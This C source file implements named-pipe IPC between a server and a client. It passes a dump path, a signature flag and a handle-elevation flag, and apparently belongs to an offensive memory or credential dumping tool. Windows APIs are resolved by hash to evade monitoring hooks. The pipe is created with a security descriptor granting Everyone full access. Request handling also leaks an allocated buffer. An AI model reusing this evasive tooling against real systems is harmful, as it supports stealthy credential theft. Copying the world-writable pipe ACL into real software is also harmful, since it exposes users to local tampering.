#include "pipe.h"

#if defined(PPL_MEDIC) || defined(SSP)

BOOL server_create_named_pipe(
    IN LPCWSTR pipe_name,
    IN BOOL async,
    OUT PHANDLE hPipe)
{
    BOOL                ret_val        = FALSE;
    BOOL                success        = FALSE;
    LPWSTR              pwszPipeName   = NULL;
    SECURITY_DESCRIPTOR sd             = { 0 };
    SECURITY_ATTRIBUTES sa             = { 0 };
    DWORD               dwOpenMode     = 0;
    DWORD               dwPipeMode     = 0;
    DWORD               dwMaxInstances = 0;

    InitializeSecurityDescriptor_t                         InitializeSecurityDescriptor = NULL;
    ConvertStringSecurityDescriptorToSecurityDescriptorW_t ConvertStringSecurityDescriptorToSecurityDescriptorW = NULL;
    CreateNamedPipeW_t                                     CreateNamedPipeW                                     = NULL;

    InitializeSecurityDescriptor = (InitializeSecurityDescriptor_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        InitializeSecurityDescriptor_SW2_HASH,
        0);
    if (!InitializeSecurityDescriptor)
    {
        api_not_found("InitializeSecurityDescriptor");
        goto cleanup;
    }

    ConvertStringSecurityDescriptorToSecurityDescriptorW = (ConvertStringSecurityDescriptorToSecurityDescriptorW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        ConvertStringSecurityDescriptorToSecurityDescriptorW_SW2_HASH,
        0);
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW)
    {
        api_not_found("ConvertStringSecurityDescriptorToSecurityDescriptorW");
        goto cleanup;
    }

    CreateNamedPipeW = (CreateNamedPipeW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        CreateNamedPipeW_SW2_HASH,
        0);
    if (!CreateNamedPipeW)
    {
        api_not_found("CreateNamedPipeW");
        goto cleanup;
    }

    pwszPipeName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszPipeName)
    {
        malloc_failed();
        goto cleanup;
    }

    success = InitializeSecurityDescriptor(
        &sd,
        SECURITY_DESCRIPTOR_REVISION);
    if (!success)
    {
        function_failed("InitializeSecurityDescriptor");
        goto cleanup;
    }

    success = ConvertStringSecurityDescriptorToSecurityDescriptorW(
        L"D:(A;OICI;GA;;;WD)",
        SDDL_REVISION_1,
        &((&sa)->lpSecurityDescriptor),
        NULL);
    if (!success)
    {
        function_failed("ConvertStringSecurityDescriptorToSecurityDescriptorW");
        goto cleanup;
    }

    swprintf_s(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\%ws", pipe_name);

    dwOpenMode = PIPE_ACCESS_DUPLEX | (async ? FILE_FLAG_OVERLAPPED : 0);
    dwPipeMode = PIPE_TYPE_BYTE | PIPE_WAIT;
    dwMaxInstances = PIPE_UNLIMITED_INSTANCES;

    *hPipe = CreateNamedPipeW(
        pwszPipeName,
        dwOpenMode,
        dwPipeMode,
        dwMaxInstances,
        PAGE_SIZE,
        PAGE_SIZE,
        0,
        &sa);
    if (*hPipe == INVALID_HANDLE_VALUE)
    {
        function_failed("CreateNamedPipeW");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    if (pwszPipeName)
        intFree(pwszPipeName);

    return ret_val;
}

BOOL client_connect_to_named_pipe(
    IN LPWSTR pipe_name,
    OUT PHANDLE hPipe)
{
    BOOL   ret_val      = FALSE;
    LPWSTR pwszPipeName = NULL;

    CreateFileW_t CreateFileW = NULL;

    CreateFileW = (CreateFileW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        CreateFileW_SW2_HASH,
        0);
    if (!CreateFileW)
    {
        api_not_found("CreateFileW");
        goto cleanup;
    }

    pwszPipeName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszPipeName)
    {
        malloc_failed();
        goto cleanup;
    }

    swprintf_s(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\%ws", pipe_name);

    *hPipe = CreateFileW(pwszPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (*hPipe == INVALID_HANDLE_VALUE)
    {
        function_failed("CreateFileW");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    if (pwszPipeName)
        intFree(pwszPipeName);

    return ret_val;
}

BOOL server_listen_on_named_pipe(
    IN HANDLE hPipe)
{
    BOOL ret_val          = FALSE;
    BOOL client_connected = FALSE;

    ConnectNamedPipe_t ConnectNamedPipe = NULL;

    ConnectNamedPipe = (ConnectNamedPipe_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        ConnectNamedPipe_SW2_HASH,
        0);
    if (!ConnectNamedPipe)
    {
        api_not_found("ConnectNamedPipe");
        goto cleanup;
    }

    client_connected = ConnectNamedPipe(hPipe, NULL);
    if (!client_connected && GetLastError() != ERROR_PIPE_CONNECTED)
    {
        function_failed("ConnectNamedPipe");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL read_data_from_pipe(
    IN HANDLE hPipe,
    OUT PVOID* data_bytes,
    OUT PDWORD data_size)
{
    BOOL     ret_val     = FALSE;
    BOOL     success     = FALSE;
    DWORD    dwBytesRead = 0;

    ReadFile_t ReadFile = NULL;

    ReadFile = (ReadFile_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        ReadFile_SW2_HASH,
        0);
    if (!ReadFile)
    {
        api_not_found("ReadFile");
        goto cleanup;
    }

    *data_bytes = intAlloc(PAGE_SIZE);
    if (!*data_bytes)
    {
        malloc_failed();
        goto cleanup;
    }

    success = ReadFile(hPipe, *data_bytes, PAGE_SIZE, &dwBytesRead, NULL);
    if (!success || dwBytesRead == 0)
    {
        function_failed("ReadFile");
        goto cleanup;
    }

    if (data_size)
        *data_size = dwBytesRead;

    ret_val = TRUE;

cleanup:
    if (!ret_val && *data_bytes)
    {
        intFree(*data_bytes);
        *data_bytes = NULL;
    }

    return ret_val;
}

BOOL server_recv_arguments_from_pipe(
    IN HANDLE hPipe,
    OUT LPSTR* dump_path,
    OUT PBOOL use_valid_sig,
    OUT PBOOL elevate_handle)
{
    BOOL     ret_val     = FALSE;
    BOOL     success     = FALSE;
    PIPC_MSG req         = NULL;

    req = intAlloc(PAGE_SIZE);
    if (!req)
    {
        malloc_failed();
        goto cleanup;
    }

    success = read_data_from_pipe(
        hPipe,
        (PVOID)&req,
        NULL);
    if (!success)
        goto cleanup;

    if (req->Type != msg_type_parameters)
    {
        DPRINT_ERR("Invalid message type");
        goto cleanup;
    }

    if (dump_path)
    {
        *dump_path = intAlloc(MAX_PATH + 1);
        if (!*dump_path)
        {
            malloc_failed();
            goto cleanup;
        }

        memcpy(*dump_path, req->p.Params.dump_path, MAX_PATH + 1);
    }
    if (use_valid_sig)
        *use_valid_sig = req->p.Params.use_valid_sig;
    if (elevate_handle)
        *elevate_handle = req->p.Params.elevate_handle;

    ret_val = TRUE;

cleanup:
    if (req)
        intFree(req);

    return ret_val;
}

BOOL write_data_to_pipe(
    IN HANDLE hPipe,
    IN PVOID data_bytes,
    IN DWORD data_size)
{
    BOOL     ret_val        = FALSE;
    BOOL     success        = FALSE;
    DWORD    dwBytesWritten = 0;

    WriteFile_t WriteFile = NULL;

    WriteFile = (WriteFile_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        WriteFile_SW2_HASH,
        0);
    if (!WriteFile)
    {
        api_not_found("WriteFile");
        goto cleanup;
    }

    success = WriteFile(hPipe, data_bytes, data_size, &dwBytesWritten, NULL);
    if (!success && GetLastError() != ERROR_IO_PENDING)
    {
        function_failed("WriteFile");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL client_send_arguments_from_pipe(
    IN HANDLE hPipe,
    IN LPSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL elevate_handle)
{
    BOOL     ret_val        = FALSE;
    BOOL     success        = FALSE;
    PIPC_MSG ParamsMsg      = NULL;

    ParamsMsg = intAlloc(sizeof(IPC_MSG));
    if (!ParamsMsg)
    {
        malloc_failed();
        goto cleanup;
    }

    ParamsMsg->Type = msg_type_parameters;
    memcpy(ParamsMsg->p.Params.dump_path, dump_path, MAX_PATH + 1 );
    ParamsMsg->p.Params.use_valid_sig = use_valid_sig;
    ParamsMsg->p.Params.elevate_handle = elevate_handle;

    success = write_data_to_pipe(
        hPipe,
        ParamsMsg,
        sizeof(*ParamsMsg));
    if (!success)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    if (ParamsMsg)
        intFree(ParamsMsg);

    return ret_val;
}

BOOL server_disconnect_pipe(
    IN HANDLE hPipe)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;

    if (!hPipe || hPipe == INVALID_HANDLE_VALUE)
        return TRUE;

    DisconnectNamedPipe_t DisconnectNamedPipe = NULL;

    DisconnectNamedPipe = (DisconnectNamedPipe_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        DisconnectNamedPipe_SW2_HASH,
        0);
    if (!DisconnectNamedPipe)
    {
        api_not_found("DisconnectNamedPipe");
        goto cleanup;
    }

    success = DisconnectNamedPipe(hPipe);
    if (!success)
    {
        function_failed("DisconnectNamedPipe");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL server_send_success(
    IN HANDLE hPipe,
    IN BOOL succeded)
{
    BOOL     ret_val        = FALSE;
    BOOL     success        = FALSE;
    PIPC_MSG ParamsMsg      = NULL;

    ParamsMsg = intAlloc(sizeof(IPC_MSG));
    if (!ParamsMsg)
    {
        malloc_failed();
        goto cleanup;
    }

    ParamsMsg->Type = msg_type_result;
    ParamsMsg->p.Result.succeded = succeded;

    success = write_data_to_pipe(
        hPipe,
        ParamsMsg,
        sizeof(*ParamsMsg));
    if (!success)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    if (ParamsMsg)
        intFree(ParamsMsg);

    return ret_val;
}

BOOL client_recv_success(
    IN HANDLE hPipe,
    OUT PBOOL succeded)
{
    BOOL     ret_val = FALSE;
    BOOL     success = FALSE;
    PIPC_MSG req     = NULL;

    success = read_data_from_pipe(
        hPipe,
        (PVOID)&req,
        NULL);
    if (!success)
        goto cleanup;

    if (req->Type != msg_type_result)
    {
        DPRINT_ERR("Invalid message type");
        goto cleanup;
    }

    *succeded = req->p.Result.succeded;

    ret_val = TRUE;

cleanup:
    if (req)
        intFree(req);

    return ret_val;
}

#endif
